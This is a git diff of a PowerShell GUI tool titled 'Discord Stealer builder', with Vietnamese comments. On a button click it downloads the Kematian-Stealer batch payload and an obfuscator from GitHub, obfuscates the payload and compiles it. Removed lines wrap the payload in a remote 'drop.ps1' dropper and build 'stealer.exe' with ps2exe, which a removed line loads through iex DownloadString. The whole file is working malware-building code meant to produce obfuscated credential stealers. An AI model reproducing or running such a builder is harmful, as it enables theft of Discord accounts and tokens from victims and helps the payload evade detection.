@@ -1,5 +1,3 @@
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1')
-
 function Encode-Base64 {
     param (
         [string]$InputString
@@ -32,6 +30,18 @@ function Obfuscate-String {
 $filePath = ".\batchobfuscator.exe"
 
 # Kiểm tra xem file có tồn tại không
+if (-Not (Test-Path $filePath)) {
+    # Nếu không tồn tại, tải xuống file từ URL
+    $url = "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe"
+    Write-Host "File không tồn tại. Đang tải xuống từ $url..."
+    
+    # Tải xuống file
+    Invoke-WebRequest -Uri $url -OutFile $filePath
+    
+    Write-Host "Tải xuống hoàn tất."
+} else {
+    Write-Host "File đã tồn tại."
+}
 
 # Lấy UUID của hệ thống
 
@@ -92,7 +102,7 @@ Add-Type -AssemblyName System.Windows.Forms
 
 # Create the form
 $form = New-Object Windows.Forms.Form
-$form.Text = 'Discord Stealer builder v2'
+$form.Text = 'Discord Stealer builder'
 $form.Size = New-Object Drawing.Size(400,200)
 $form.StartPosition = 'CenterScreen'
 
@@ -123,7 +133,7 @@ $button.Add_Click({
         $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/main.bat"
         $filePath = "$env:TEMP\main.bat"
         $filePathprotect = "$env:TEMP\main_obf.bat"
-
+        
         # Download the file
         Invoke-WebRequest -Uri $url -OutFile $filePath
 
@@ -138,27 +148,13 @@ $button.Add_Click({
         # Path to the complie.exe executable
         $compliePath = ".\converter.bat"  # Change this to the correct path
         $protectPath = ".\batchobfuscator.exe"  # Change this to the correct path
-        Invoke-WebRequest -Uri "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe" -OutFile $protectPath
+
         # Execute the .bat file
-        Start-Process -FilePath $protectPath -ArgumentList "-f `"$filePath`"" -NoNewWindow -Wait
-        # Start-Process -FilePath $compliePath -ArgumentList "`"$filePathprotect`" -nu" -NoNewWindow -Wait
-        $url = "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/drop/drop.ps1"
-
-        $scriptContent = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
-        $encodedFileContent = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($filePathprotect))
-
-
-        $pathexe = "$env:TEMP\main.exe"
-        $codebase64Content = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content -Path $filePathprotect -Raw)))
-        ($scriptContent -replace "batcodeinhere", $codebase64Content -replace "g7oKH6J6566e", "``g7``o``K``H6``J65``6``6``e") | Set-Content -Path "$env:TEMP\main.ps1"
-         
-        Invoke-ps2exe "$env:TEMP\main.ps1" "$pathexe"
-        Move-Item -Path $pathexe -Destination "stealer.exe"
+        Start-Process -FilePath $protectPath -ArgumentList "-f $filePath -nu -dc" -NoNewWindow -Wait
+        Start-Process -FilePath $compliePath -ArgumentList $filePathprotect -NoNewWindow -Wait
 
         # Delete the .bat file after execution
         Remove-item "settings.json"
-        Remove-item $protectPath
-        Remove-item $filePath
         # Show a message box
         [System.Windows.Forms.MessageBox]::Show('Process completed and file deleted.', 'Completed', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
     } else {
